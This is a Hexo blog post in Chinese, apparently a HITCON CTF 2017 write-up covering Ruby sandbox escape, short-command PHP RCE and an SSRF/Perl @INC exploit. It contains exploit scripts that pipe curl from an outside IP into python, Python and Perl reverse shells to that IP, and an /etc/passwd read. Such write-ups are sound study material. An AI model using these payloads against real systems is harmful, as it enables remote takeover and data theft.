@@ -1,0 +1,757 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,writeup," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Baby Ruby Escaping12345678910111213141516171819#!/usr/bin/env rubyrequire &amp;apos;readline&amp;apos;proc &amp;#123;  my_exit = Kernel.method(:exit!)  my_puts = $stdout.method(:puts)  ObjectSpace.each_object(Mod">
+<meta name="keywords" content="ctf,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hitcon-ctf-2017">
+<meta property="og:url" content="http://ultramangaia.github.io/blog/2017/hitcon-ctf-2017.html">
+<meta property="og:site_name" content="UltramanGaia&#39;s Blog">
+<meta property="og:description" content="Baby Ruby Escaping12345678910111213141516171819#!/usr/bin/env rubyrequire &amp;apos;readline&amp;apos;proc &amp;#123;  my_exit = Kernel.method(:exit!)  my_puts = $stdout.method(:puts)  ObjectSpace.each_object(Mod">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-12-23T09:58:18.371Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hitcon-ctf-2017">
+<meta name="twitter:description" content="Baby Ruby Escaping12345678910111213141516171819#!/usr/bin/env rubyrequire &amp;apos;readline&amp;apos;proc &amp;#123;  my_exit = Kernel.method(:exit!)  my_puts = $stdout.method(:puts)  ObjectSpace.each_object(Mod">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://ultramangaia.github.io/blog/2017/hitcon-ctf-2017.html"/>
+
+
+
+
+
+  <title>hitcon-ctf-2017 | UltramanGaia's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">UltramanGaia's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://ultramangaia.github.io/blog/2017/hitcon-ctf-2017.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="UltramanGaia">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="UltramanGaia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">hitcon-ctf-2017</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-06T17:34:33+08:00">
+                2017-11-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Baby-Ruby-Escaping"><a href="#Baby-Ruby-Escaping" class="headerlink" title="Baby Ruby Escaping"></a>Baby Ruby Escaping</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env ruby</span><br><span class="line">require &apos;readline&apos;</span><br><span class="line">proc &#123;</span><br><span class="line">  my_exit = Kernel.method(:exit!)</span><br><span class="line">  my_puts = $stdout.method(:puts)</span><br><span class="line">  ObjectSpace.each_object(Module) &#123; |m| m.freeze if m != Readline &#125;</span><br><span class="line">  set_trace_func proc &#123; |event, file, line, id, binding, klass|</span><br><span class="line">    bad_id = /`|exec|foreach|fork|load|method_added|open|read(?!line$)|require|set_trace_func|spawn|syscall|system/</span><br><span class="line">    bad_class = /(?&lt;!True|False|Nil)Class|Module|Dir|File|ObjectSpace|Process|Thread/</span><br><span class="line">    if event =~ /class/ || (event =~ /call/ &amp;&amp; (id =~ bad_id || klass.to_s =~ bad_class))</span><br><span class="line">      my_puts.call &quot;\e[1;31m== Hacker Detected (#&#123;$&amp;&#125;) ==\e[0m&quot;</span><br><span class="line">      my_exit.call</span><br><span class="line">    end</span><br><span class="line">  &#125;</span><br><span class="line">&#125;.call</span><br><span class="line">loop do</span><br><span class="line">  line = Readline.readline(&apos;baby&gt; &apos;, true)</span><br><span class="line">  puts &apos;=&gt; &apos; + eval(line, TOPLEVEL_BINDING).inspect</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+<p>Ruby? 不熟orz，然后尝试学了下ruby，后来发现了个任意文件读取，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ARGV&lt;&lt;&quot;/etc/passwd&quot;</span><br><span class="line">print while gets</span><br></pre></td></tr></table></figure></p>
+<p>果然是读不到什么重要的东西，ctf中感觉读下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">/flag</span><br><span class="line">/flag.txt</span><br><span class="line">/home/xxx/flag</span><br><span class="line">/home/xxx/flag.txt</span><br><span class="line">index.php等源代码</span><br><span class="line">等，没有发现的话应该盲读的意义就不大了。</span><br></pre></td></tr></table></figure>
+<p>嗯，接下来想办法列目录…搞了好久没办法，本地测试的时候不小心按了两下tab，发现可以显示当前目录文件。<br>哦，原来是因为Readline可以保存历史记录，还可以智能地列目录。<br>然后列目录，读取文件就可以得到flag。</p>
+<h2 id="BabyFirst-Revenge"><a href="#BabyFirst-Revenge" class="headerlink" title="BabyFirst Revenge"></a>BabyFirst Revenge</h2><p>提示了是在Hitcon ctf 2015的baby first基础上增加难度的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>限制了linux命令只能是小于等于5个字符。<br>ls写文件，sh执行命令<br>rev翻转字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"># generate `ls -t&gt;g` to file &quot;_&quot;</span><br><span class="line">http://host/?cmd=&gt;ls\</span><br><span class="line">http://host/?cmd=ls&gt;_</span><br><span class="line">http://host/?cmd=&gt;\ \</span><br><span class="line">http://host/?cmd=&gt;-t\</span><br><span class="line">http://host/?cmd=&gt;\&gt;g</span><br><span class="line">http://host/?cmd=ls&gt;&gt;_</span><br><span class="line"># generate `curl 118.89.45.18|python` to file &quot;g&quot;</span><br><span class="line">http://host/?cmd=&gt;on</span><br><span class="line">http://host/?cmd=&gt;th\</span><br><span class="line">http://host/?cmd=&gt;py\</span><br><span class="line">http://host/?cmd=&gt;\|\</span><br><span class="line">http://host/?cmd=&gt;18\</span><br><span class="line">http://host/?cmd=&gt;5.\</span><br><span class="line">http://host/?cmd=&gt;4\</span><br><span class="line">http://host/?cmd=&gt;89.\</span><br><span class="line">http://host/?cmd=&gt;8.\</span><br><span class="line">http://host/?cmd=&gt;11\</span><br><span class="line">http://host/?cmd=&gt;\ \</span><br><span class="line">http://host/?cmd=&gt;rl\</span><br><span class="line">http://host/?cmd=&gt;cu\</span><br><span class="line">http://host/?cmd=sh _</span><br><span class="line"># got shell</span><br><span class="line">http://host/?cmd=sh g</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">cmds = [</span><br><span class="line">  &quot;&gt;ls\\&quot;,</span><br><span class="line">  &quot;ls&gt;_&quot;,</span><br><span class="line">  &quot;&gt;\\ \\&quot;,</span><br><span class="line">  &quot;&gt;-t\\&quot;,</span><br><span class="line">  &quot;&gt;\\&gt;g&quot;,</span><br><span class="line">  &quot;ls&gt;&gt;_&quot;,</span><br><span class="line">  &quot;&gt;on&quot;,</span><br><span class="line">  &quot;&gt;th\\&quot;,</span><br><span class="line">  &quot;&gt;py\\&quot;,</span><br><span class="line">  &quot;&gt;\\|\\&quot;,</span><br><span class="line">  &quot;&gt;18\\&quot;,</span><br><span class="line">  &quot;&gt;5.\\&quot;,</span><br><span class="line">  &quot;&gt;4\\&quot;,</span><br><span class="line">  &quot;&gt;89.\\&quot;,</span><br><span class="line">  &quot;&gt;8.\\&quot;,</span><br><span class="line">  &quot;&gt;11\\&quot;,</span><br><span class="line">  &quot;&gt;\\ \\&quot;,</span><br><span class="line">  &quot;&gt;rl\\&quot;,</span><br><span class="line">  &quot;&gt;cu\\&quot;,</span><br><span class="line">  &quot;sh _&quot;,</span><br><span class="line">  &quot;sh g&quot;,</span><br><span class="line">]</span><br><span class="line">requests.get(&quot;http://118.89.45.18/web1.php?reset=1&quot;)</span><br><span class="line">for cmd in cmds:</span><br><span class="line">  requests.get(&quot;http://118.89.45.18/web1.php?cmd=%s&quot;%cmd)</span><br></pre></td></tr></table></figure>
+<p>找个python反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;118.89.45.18&quot;,5010));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><br></pre></td></tr></table></figure></p>
+<h2 id="BabyFirst-Revenge-v2"><a href="#BabyFirst-Revenge-v2" class="headerlink" title="BabyFirst Revenge v2"></a>BabyFirst Revenge v2</h2><p>同上一题，但是限制4个字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"># generate &quot;g&gt; ht- sl&quot; to file &quot;v&quot;</span><br><span class="line">&gt;dir</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">*&gt;v</span><br><span class="line"># reverse file &quot;v&quot; to file &quot;x&quot;, content &quot;ls -th &gt;g&quot;</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br><span class="line"># generate &quot;curl 118.89.45.18|python;&quot;</span><br><span class="line">&gt;\;\</span><br><span class="line">&gt;on\</span><br><span class="line">&gt;th\</span><br><span class="line">&gt;py\</span><br><span class="line">&gt;\|\</span><br><span class="line">&gt;18\</span><br><span class="line">&gt;5.\</span><br><span class="line">&gt;4\</span><br><span class="line">&gt;9.\</span><br><span class="line">&gt;8\</span><br><span class="line">&gt;8.\</span><br><span class="line">&gt;11\</span><br><span class="line">&gt;\ \</span><br><span class="line">&gt;rl\</span><br><span class="line">&gt;cu\</span><br><span class="line"># got shell</span><br><span class="line">sh x</span><br><span class="line">sh g</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">cmds = [</span><br><span class="line">  &quot;&gt;dir&quot;,</span><br><span class="line">  &quot;&gt;sl&quot;,</span><br><span class="line">  &quot;&gt;g\&gt;&quot;,</span><br><span class="line">  &quot;&gt;ht-&quot;,</span><br><span class="line">  &quot;*&gt;v&quot;,</span><br><span class="line">  &quot;&gt;rev&quot;,</span><br><span class="line">  &quot;*v&gt;x&quot;,</span><br><span class="line">  &quot;&gt;\\;\\&quot;,</span><br><span class="line">  &quot;&gt;on\\&quot;,</span><br><span class="line">  &quot;&gt;th\\&quot;,</span><br><span class="line">  &quot;&gt;py\\&quot;,</span><br><span class="line">  &quot;&gt;\\|\\&quot;,</span><br><span class="line">  &quot;&gt;18\\&quot;,</span><br><span class="line">  &quot;&gt;5.\\&quot;,</span><br><span class="line">  &quot;&gt;4\\&quot;,</span><br><span class="line">  &quot;&gt;9.\\&quot;,</span><br><span class="line">  &quot;&gt;8\\&quot;,</span><br><span class="line">  &quot;&gt;8.\\&quot;,</span><br><span class="line">  &quot;&gt;11\\&quot;,</span><br><span class="line">  &quot;&gt;\\ \\&quot;,</span><br><span class="line">  &quot;&gt;rl\\&quot;,</span><br><span class="line">  &quot;&gt;cu\\&quot;,</span><br><span class="line">  &quot;sh x&quot;,</span><br><span class="line">  &quot;sh g&quot;,</span><br><span class="line">]</span><br><span class="line">requests.get(&quot;http://118.89.45.18/web1.php?reset=1&quot;)</span><br><span class="line">for cmd in cmds:</span><br><span class="line">  requests.get(&quot;http://118.89.45.18/web1.php?cmd=%s&quot;%cmd)</span><br></pre></td></tr></table></figure>
+<h2 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme?"></a>SSRFme?</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info = pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+<p>CVE-2016-1238<br>It was found that perl can load modules from the current directory if not found in the module directories<br>A local, authenticated attacker could create a specially crafted module in a writable directory and trick a user into running a perl program from that directory; if the module is not found in previous @INC paths, it will load and execute the attacker’s module.</p>
+<p>由于perl处理模块加载时存在漏洞，如果内部存在相应模块，会尝试在当前目录加载。<br>找个perl的反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use Socket;$i=&quot;118.89.45.18&quot;;$p=5010;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://13.115.136.15/?url=http://118.89.45.18/evil.pl&amp;filename=evil.pl</span><br><span class="line">http://13.115.136.15/?url=evil://118.89.45.18/evil.pl&amp;filename=evil.pl</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog/2017/python-pandas基础使用.html" rel="next" title="python pandas基础使用">
+                <i class="fa fa-chevron-left"></i> python pandas基础使用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/blog/2017/IT项目管理.html" rel="prev" title="IT项目管理">
+                IT项目管理 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="UltramanGaia" />
+            
+              <p class="site-author-name" itemprop="name">UltramanGaia</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Baby-Ruby-Escaping"><span class="nav-number">1.</span> <span class="nav-text">Baby Ruby Escaping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BabyFirst-Revenge"><span class="nav-number">2.</span> <span class="nav-text">BabyFirst Revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BabyFirst-Revenge-v2"><span class="nav-number">3.</span> <span class="nav-text">BabyFirst Revenge v2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRFme"><span class="nav-number">4.</span> <span class="nav-text">SSRFme?</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">UltramanGaia</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
